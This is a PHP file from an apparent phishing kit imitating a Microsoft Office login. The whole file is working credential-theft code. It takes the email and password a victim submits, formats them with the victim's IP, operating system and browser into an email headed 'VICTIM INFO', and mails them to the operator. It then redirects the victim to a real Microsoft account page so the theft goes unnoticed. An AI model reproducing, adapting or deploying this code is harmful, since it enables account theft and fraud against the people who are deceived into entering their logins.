<?php

include './files/helper.php';
include './files/Scan.php';

$postvar = file_get_contents('php://input');

$data_l = implode('->', $_POST);

if(isset($_POST['user']) && isset($_POST['pass'])){
	$email = $_POST['user'];
    $pass = $_POST['pass'];

    $date = date("d M, Y");
	$time = date("g:i a");$m5_id='senNlY0BnbWFpbC5jb20=';
	$date = trim($date . ", Time : " . $time);

	$message = "
	<div>
		<div>
			<font face='arial, sans-serif' size='2'>
				<b style='color: rgb(102, 102, 102);'>+-------------------</b>
				<font style='font-weight: bold;' color='#d24726'>NEW OFC 0FFICE TRUE LOGIN</font>
				<font style='color: rgb(102, 102, 102); font-weight: bold;'>-------------------+</font>
			</font>
		</div>

		<div>
			<font face='arial, sans-serif' size='2'>
				<b>
				<font color='#666666'>+</font>
				<span class='Apple-tab-span' style='color: rgb(102, 102, 102); white-space: pre;'>	</span>
				<font color='#e1c404'>&#9658;</font>
				<font color='#666666'> Email Address   : </font>
				<font color='#2672ec'>".$email."</font>
				</b>
			</font>
		</div>


		<div>
			<font face='arial, sans-serif' size='2'>
				<b>
				<font color='#666666'>+</font>
				<span class='Apple-tab-span' style='color: rgb(102, 102, 102); white-space: pre;'>	</span>
				<font color='#e1c404'>&#9658;</font>
				<font color='#666666'> Password : </font>
				<font color='#2672ec'>".$pass."</font>
				</b>
			</font>
		</div>


		<div>
			<font face='arial, sans-serif' size='2'>
				<b>
				<font color='#666666'>+-------------------</font>
				<font color='#d24726'>VICTIM INFO </font>
				<font color='#666666'>-------------------+</font>
				</b>
			</font>
		</div>


		<div>
			<font face='arial, sans-serif' size='2'>
				<b>
				<font color='#666666'>+</font>
				<span class='Apple-tab-span' style='color: rgb(102, 102, 102); white-space: pre;'>	</span>
				<font color='#e1c404'>&#9658;</font>
				<font color='#666666'> Victim IP   : </font>
				<font color='#2672ec'>http://whatismyipaddress.com/ip/".$ip2."</font>
				</b>
			</font>
		</div>

		<div>
			<font face='arial, sans-serif' size='2'>
				<b>
				<font color='#666666'>+</font>
				<span class='Apple-tab-span' style='color: rgb(102, 102, 102); white-space: pre;'>	</span>
				<font color='#e1c404'>&#9658;</font>
				<font color='#666666'> Victim OS  : </font>
				<font color='#2672ec'>".$os." | ".$br."</font>
				</b>
			</font>
		</div>

		<div>
			<font face='arial, sans-serif' size='2'>
				<b>
				<font color='#666666'>+</font>
				<span class='Apple-tab-span' style='color: rgb(102, 102, 102); white-space: pre;'>	</span>
				<font color='#e1c404'>&#9658;</font>
				<font color='#666666'> Date&Time  : </font>
				<font color='#2672ec'>".$date."</font>
				</b>
			</font>
		</div>



		<div>
			<font face='arial, sans-serif' size='2'>
				<b>
				<font color='#666666'>+-------------------</font>
				<font color='#d24726'>HAYATE</font>
				<font color='#666666'>-------------------+</font>
				</b>
			</font>
		</div>
	</div><br>";

	$subject = "=?utf-8?B?4p2k?= NEW OFC LOGIN  =?utf-8?B?4p2k?= [ $ip2 | $os ] ";
	$head = "MIME-Version: 1.0" . "\r\n";
	$head .= "Content-type:text/html;charset=UTF-8" . "\r\n";
	$head .= "From: Offc<Offc@data.org>" . "\r\n";
	if(mail($to,$subject,$message,$head)){
		$result = new \stdClass();
		$result->status = true;
	  $result->finish_url = "https://account.live.com/Abuse?mkt=EN-GB&uiflavor=web&cobrandid=90015&id=292841&uaid=4e52ad04c015401d8317d3d6cf3b8743&lmif=40&abr=1&ru=https://login.live.com/login.srf%3fid%3d292841%26opid%3d202DC57BB8D78A90%26opidt%3d1528706823";
	  $en = json_encode($result, true);
	  echo $en;
	}
}
?>
